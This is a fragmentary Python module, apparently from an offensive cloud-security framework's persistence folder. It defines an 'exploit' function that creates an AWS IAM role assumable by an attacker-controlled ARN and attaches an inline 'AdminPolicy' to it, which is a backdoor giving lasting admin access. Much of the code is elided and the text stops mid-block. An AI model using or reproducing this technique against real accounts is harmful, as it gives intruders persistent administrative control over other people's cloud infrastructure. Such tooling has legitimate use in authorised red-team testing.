# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-Nebula\teamserver\core\module\persistence\aws_iam_create_admin_role.py
import json
import random
import string
...
def exploit(profile, workspace):
    ...
    return_data = {"Role": role, "ExternalID": externalID, "AttackerARN": attackerARN}
    ...
    try:
        ...
        profile.create_role(RoleName=role, AssumeRolePolicyDocument=json.dumps(assumePolicy))
        return_data["RoleStatus"] = f"Role {role} Created"
    except Exception as e:
        return {"error": f"Error creating the role: {str(e)}"}

    try:
        profile.put_role_policy(RoleName=role, PolicyName="AdminPolicy", PolicyDocument=policyDoc)
